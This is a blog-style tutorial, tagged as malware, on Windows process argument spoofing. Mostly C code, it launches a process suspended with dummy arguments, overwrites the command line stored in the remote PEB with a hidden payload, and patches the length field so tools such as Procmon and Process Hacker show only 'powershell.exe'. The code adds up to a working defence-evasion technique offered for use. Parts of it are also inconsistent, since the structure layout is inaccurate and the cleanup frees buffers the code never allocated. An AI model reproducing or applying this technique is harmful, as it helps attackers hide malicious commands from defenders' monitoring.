---
title: Process Argument Spoofing
date: 2024-04-21
categories:
  - malware
  - hiding
tags:
  - english
toc: "true"
---
Process argument spoofing involves concealing the command-line arguments of a newly spawned process. This tactic aims to enable command execution without disclosing the commands to logging services like **Procmon**. 

The first step to performing argument spoofing is to understand where the arguments are being stored inside the process. 

## PEB structure

The Process Environment Block (PEB) structure, which is a data structure used internally by the Windows operating system to **store information about a process during its execution**. The PEB contains various information about the process, including pointers to the process's image, environment variables, and other data relevant to its execution. The full structure is as follows:

```c
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;              // Indicates if the address space is inherited
    BOOLEAN ReadImageFileExecOptions;           // Indicates if image file execution options are read
    BOOLEAN BeingDebugged;                      // Indicates if the process is being debugged
    BOOLEAN SpareBool;                          // Reserved
    HANDLE Mutant;                              // Handle to the process' mutant
    PVOID ImageBaseAddress;                      // Base address of the process executable
    PPEB_LDR_DATA LoaderData;                   // Pointer to the loader data structure
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;  // Pointer to process parameters structure
    // More members omitted for brevity
} PEB, *PPEB;
```
Within the **PEB**, there is a structure called **RTL_USER_PROCESS_PARAMETERS**, which further holds information specific to the **user-mode** part of the process. This structure includes the **CommandLine** member, which stores the command line arguments passed to the process when it was started.

``` c
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;                // The maximum length of this structure
    ULONG Length;                       // The actual length of this structure
    ULONG Flags;                        // Flags indicating various options
    ULONG DebugFlags;                   // Debugging flags
    PVOID ConsoleHandle;                // Handle to the console
    ULONG ConsoleFlags;                 // Console flags
    HANDLE StandardInput;               // Handle to standard input
    HANDLE StandardOutput;              // Handle to standard output
    HANDLE StandardError;               // Handle to standard error
    UNICODE_STRING CurrentDirectoryPath;// Path to the current directory
    HANDLE CurrentDirectoryHandle;      // Handle to the current directory
    UNICODE_STRING DllPath;             // Path to the DLLs
    UNICODE_STRING ImagePathName;       // Path to the executable image
    UNICODE_STRING CommandLine;         // Holds the command line arguments
    PVOID Environment;                  // Pointer to the environment block
    ULONG StartingPositionLeft;         // Left position of the window
    ULONG StartingPositionTop;          // Top position of the window
    ULONG Width;                        // Width of the window
    ULONG Height;                       // Height of the window
    ULONG CharWidth;                    // Character width of the window
    ULONG CharHeight;                   // Character height of the window
    ULONG ConsoleTextAttributes;        // Console text attributes
    ULONG WindowFlags;                  // Window flags
    ULONG ShowWindowFlags;              // Show window flags
    UNICODE_STRING WindowTitle;         // Title of the window
    UNICODE_STRING DesktopInfo;         // Desktop information
    UNICODE_STRING ShellInfo;           // Shell information
    UNICODE_STRING RuntimeData;         // Runtime data
    UNICODE_STRING CurrentDirectores;    // Current directories
    UNICODE_STRING EnvironmentPath;     // Environment path
    ULONG StartingX;                    // Starting X coordinate of the window
    ULONG StartingY;                    // Starting Y coordinate of the window
    ULONG CountX;                       // Count of X coordinate
    ULONG CountY;                       // Count of Y coordinate
    ULONG CountCharsX;                  // Count of characters in X direction
    ULONG CountCharsY;                  // Count of characters in Y direction
    ULONG FillAttribute;                // Fill attribute
    ULONG WindowFlags2;                 // Window flags (continued)
    ULONG ShowWindowFlags2;             // Show window flags (continued)
    UNICODE_STRING CurrentDirectoryDosPath;   // DOS path to the current directory
    UNICODE_STRING RuntimeDataDosPath; // DOS path to the runtime data
    UNICODE_STRING IconPath;            // Path to the icon
    UNICODE_STRING ShellInfoExeName;    // Name of the shell executable
    UNICODE_STRING ShellInfoWindowTitle;// Title of the shell window
    UNICODE_STRING CurrentDirectoresDos;// DOS path to the current directories
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
```
As can be seen, **CommandLine** is a **UNICODE_STRING** struct. In this structure, the `Buffer` element holds the contents of the command line arguments. Knowing this, you can access the command line arguments by using `PEB->ProcessParameters.CommandLine.Buffer` as a wide-character string:

```c
typedef struct _UNICODE_STRING {
  USHORT Length;           // Length of the string
  USHORT MaximumLength;   // Maximum length of the string
  PWSTR  Buffer;          // Pointer to the string buffer
} UNICODE_STRING, *PUNICODE_STRING;
```
## Walkthrough

To spoof command line arguments of a process, one needs to follow these steps:

1. **Create Target Process in Suspended State:** Begin by creating the target process but keep it in a suspended state. During creation, pass dummy arguments that won't raise suspicion.
2. **Retrieve Remote PEB Address:** Obtain the remote Process Environment Block (PEB) address of the created process.
3. **Read Remote PEB Structure:** Read the PEB structure from the created process remotely.
4. **Read Remote ProcessParameters:** Read the ProcessParameters structure from the remote process.
5. **Patch CommandLine Buffer:** Modify the CommandLine.Buffer string within the ProcessParameters structure with the desired payload string. This ensures that logging services capture the dummy arguments instead of the actual ones.
6. **Resume the Process:** Finally, resume the process to execute with the spoofed arguments.

It's crucial to ensure that the length of the payload argument written to `PEB->ProcessParameters.CommandLine.Buffer` at runtime is smaller than or equal to the length of the dummy argument created during the process's suspension. If the real argument is larger, it might overwrite bytes outside the dummy argument, leading to a potential crash. Therefore, always ensure that the dummy argument is larger than the argument to be executed, thus avoiding such issues.

### Step 1: Create Target Process in Suspended State

To create a process in a suspended state we will use the [CreateProcessW()](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) function with the [CREATE_SUSPENDED | CREATE_NO_WINDOW](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) flag. 

```c
CreateProcessW(
    NULL,                                   // lpApplicationName: Name of the executable (NULL if using lpCommandLine)
    szProcess,                              // lpCommandLine: Command line to be executed
    NULL,                                   // lpProcessAttributes: Process security attributes (NULL for default)
    NULL,                                   // lpThreadAttributes: Thread security attributes (NULL for default)
    FALSE,                                  // bInheritHandles: Whether handles in the calling process are inherited
    CREATE_SUSPENDED | CREATE_NO_WINDOW,    // dwCreationFlags: Creation flags (e.g., CREATE_SUSPENDED, CREATE_NO_WINDOW)
    NULL,                                   // lpEnvironment: Environment block (NULL to inherit from calling process)
    L"C:\\Windows\\System32\\",             // lpCurrentDirectory: Current directory for the new process
    &Si,                                    // lpStartupInfo: Startup information for the new process
    &Pi);                                   // lpProcessInformation: Process information for the new process
```

### Step 2: Retrieve Remote PEB Address

To obtain the Process Environment Block (PEB) address of a remote process, you need to utilize the `NtQueryInformationProcess` function with the `ProcessBasicInformation` flag. When this flag is used, `NtQueryInformationProcess` returns a `PROCESS_BASIC_INFORMATION` structure defined as follows:

```c
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS    ExitStatus;                     // The exit status of the process
    PPEB        PebBaseAddress;                 // Pointer to the Process Environment Block (PEB) structure
    ULONG_PTR   AffinityMask;                   // Affinity mask of the process
    KPRIORITY   BasePriority;                   // Base priority of the process
    ULONG_PTR   UniqueProcessId;                // Unique identifier of the process
    ULONG_PTR   InheritedFromUniqueProcessId;   // Unique identifier of the process that created this process
} PROCESS_BASIC_INFORMATION;
```
It's important to note that `NtQueryInformationProcess` is a system call, and thus it needs to be invoked using `GetModuleHandle` and `GetProcAddress`. Here is an example: 

```c
// Load the NtQueryInformationProcess function dynamically
    HMODULE hNtDll = GetModuleHandle("ntdll.dll");
    if (hNtDll == NULL) {
        printf("Failed to load ntdll.dll. Error code: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    NtQueryInformationProcessFunc NtQueryInformationProcess = (NtQueryInformationProcessFunc)GetProcAddress(hNtDll, "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        printf("Failed to get address of NtQueryInformationProcess. Error code: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

// Call NtQueryInformationProcess to retrieve process basic information
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        printf("NtQueryInformationProcess failed. Status: %ld\n", status);
        CloseHandle(hProcess);
        return 1;
    }
```

### Steps 3 and 4: Read Remote PEB Structure and ProcessParameters

After retrieving the PEB address for the remote process, you can read the PEB structure using the `ReadProcessMemory` WinAPI function. 

```c
BOOL ReadProcessMemory(
  HANDLE  hProcess,                // Handle to the process from which to read the memory
  LPCVOID lpBaseAddress,           // Address in the specified process from which to read
  LPVOID  lpBuffer,                // Buffer to receive the contents read from the process's address space
  SIZE_T  nSize,                   // Number of bytes to read from the specified address
  SIZE_T  *lpNumberOfBytesRead    // Pointer to a variable that receives the number of bytes read
);
```

The function must be invoked twice:

1. The first invocation is used to read the PEB structure by passing the PEB address obtained from the output of `NtQueryInformationProcess` in the `lpBaseAddress` parameter.
2. It is then invoked a second time to read the `RTL_USER_PROCESS_PARAMETERS` structure, passing its address to the `lpBaseAddress` parameter. 

`RTL_USER_PROCESS_PARAMETERS` is found within the [PEB structure](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb) obtained during the first invocation. Recall that this structure contains the `CommandLine` member, which is required to perform argument spoofing.
 
 > **Note**
 > 
 > the `RTL_USER_PROCESS_PARAMETERS` structure contains various process parameters, Some of them have an undefined length (between some boundaries). The actual size of this structure can vary depending on the length of the command line arguments passed to the process.

When reading the `RTL_USER_PROCESS_PARAMETERS` structure using `ReadProcessMemory` we have to ensure that you read enough bytes to capture the entire structure. If you only read the size specified by `sizeof(RTL_USER_PROCESS_PARAMETERS)`, you may not retrieve all the necessary information if the actual structure size exceeds that amount.

An additional 225 bytes may do the trick to read beyond `sizeof(RTL_USER_PROCESS_PARAMETERS)`. This extra buffer is necessary to account for potential variations in the size of the structure, ensuring that all the relevant data, including the command line arguments.

This is the C code for this part: 

```c
    // Read the PEB structure using ReadProcessMemory
    PEB peb;
    SIZE_T bytesRead;
    BOOL success = ReadProcessMemory(
        hProcess,                               // Handle to the remote process
        pebAddress,                             // Address of the PEB structure
        &peb,                                   // Buffer to store the PEB structure
        sizeof(PEB),                            // Size of the PEB structure
        &bytesRead                              // Number of bytes read
    );

    // Read the RTL_USER_PROCESS_PARAMETERS structure from within the PEB structure
    RTL_USER_PROCESS_PARAMETERS parameters;
    success = ReadProcessMemory(
        hProcess,                               // Handle to the remote process
        peb.ProcessParameters,                  // Address of the RTL_USER_PROCESS_PARAMETERS structure within the PEB
        &parameters,                            // Buffer to store the RTL_USER_PROCESS_PARAMETERS structure
        sizeof(RTL_USER_PROCESS_PARAMETERS),   // Size of the RTL_USER_PROCESS_PARAMETERS structure
        &bytesRead                              // Number of bytes read
    );
```

### Step 5: Patch CommandLine Buffer

After obtaining the RTL_USER_PROCESS_PARAMETERS structure, we can manipulate the CommandLine.Buffer. This is achieved through the WriteProcessMemory WinAPI function, demonstrated below:

```c
    LPVOID lpBaseAddress = parameters.CommandLine.Buffer; // Address of CommandLine.Buffer
    LPCVOID lpBuffer = newArgument; // New process argument
    SIZE_T nSize = (lstrlenW(newArgument) * sizeof(WCHAR)) + sizeof(WCHAR); // Size of the buffer to write
    SIZE_T bytesWritten; // Number of bytes written

    // Write the new process argument to CommandLine.Buffer using WriteProcessMemory
    BOOL success = WriteProcessMemory(
        hProcess,               // Handle to the remote process
        lpBaseAddress,          // Address of the buffer to write to (CommandLine.Buffer)
        lpBuffer,               // Data to write (new process argument)
        nSize,                  // Size of the buffer to write in bytes
        &bytesWritten           // Number of bytes written
    )
```
The `nSize` parameter is the size of the buffer to write in _bytes_. It should be equal to the length of the string that's being written multiplied by the size of `WCHAR` plus 1 (for the null character).

### Step 6: Resume the process

This involves cleaning up the allocated memory, resuming the process thread, and validating the output parameters. If all output parameters are valid, the function returns TRUE; otherwise, it returns FALSE.

```c
// Cleaning up allocated memory for PEB and RTL_USER_PROCESS_PARAMETERS structures
HeapFree(GetProcessHeap(), NULL, pPeb);
HeapFree(GetProcessHeap(), NULL, pParms);

// Resuming the suspended process with the new parameters
ResumeThread(Pi.hThread);

// Saving output parameters: process ID, process handle, and thread handle
*dwProcessId = Pi.dwProcessId;
*hProcess = Pi.hProcess;
*hThread = Pi.hThread;

// Checking if all output parameters are valid
if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) {
    // Everything is valid, return TRUE
    return TRUE;
}

// If any of the output parameters are NULL, return FALSE
return FALSE;
```
## A little twist

While Procmon was successfully tricked into logging dummy command line arguments, this approach faces limitations when applied to tools like Process Hacker and other tools such as [Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer). Unlike Procmon, Process Hacker utilizes `NtQueryInformationProcess` to retrieve process command line arguments at runtime, thereby exposing the manipulation of `PEB->ProcessParameters.CommandLine.Buffer`.

### Solution

Tools like Process Hacker and Process Explorer adhere strictly to the length specified by `CommandLine.Length` when reading `CommandLine.Buffer`, as Microsoft states in [their documentation](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string) that `UNICODE_STRING.Buffer` might not be null-terminated. This means they do not rely on null-termination of `UNICODE_STRING.Buffer`, ensuring they only retrieve the necessary bytes from the buffer.

In short, these tools limit the number of bytes read from `CommandLine.Buffer` to be equal to `CommandLine.Length` in order to prevent reading additional unnecessary bytes in the event that `CommandLine.Buffer` is not null-terminated.

To fix this, it's necessary to control the exposure of the payload within `CommandLine.Buffer`. This can be achieved by adjusting the value of `CommandLine.Length` to limit the number of bytes accessible. By patching `CommandLine.Length` in the remote process, one can dictate the size of the buffer that can be read.

### Patching

The following code snippet patches `PEB->ProcessParameters.CommandLine.Length` to limit what Process Hacker can read from `CommandLine.Buffer` only to `powershell.exe`. 

```c
DWORD dwNewLen = sizeof(L"powershell.exe");

if (!WriteToTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))){
  return FALSE;
}
```

## Conslusion

Understanding the structure of the Process Environment Block (PEB) and the RTL_USER_PROCESS_PARAMETERS structure is essential for manipulating process parameters effectively.

By accessing the PEB and navigating to the RTL_USER_PROCESS_PARAMETERS structure within it, we can locate the CommandLine member, which holds the command-line arguments passed to the process. This member is stored as a UNICODE_STRING structure, allowing us to access and modify the command-line arguments.

The process of spoofing command-line arguments involves creating a target process in a suspended state, retrieving the remote PEB address, reading the remote PEB structure and ProcessParameters, patching the CommandLine.Buffer with the desired payload string using WriteProcessMemory, and finally resuming the process execution.

When patching the CommandLine.Buffer, it's crucial to ensure that the size of the payload argument written to PEB->ProcessParameters.CommandLine.Buffer is smaller than or equal to the size of the dummy argument created during process suspension. Failing to do so may result in overwriting bytes outside the dummy argument, potentially causing the process to crash.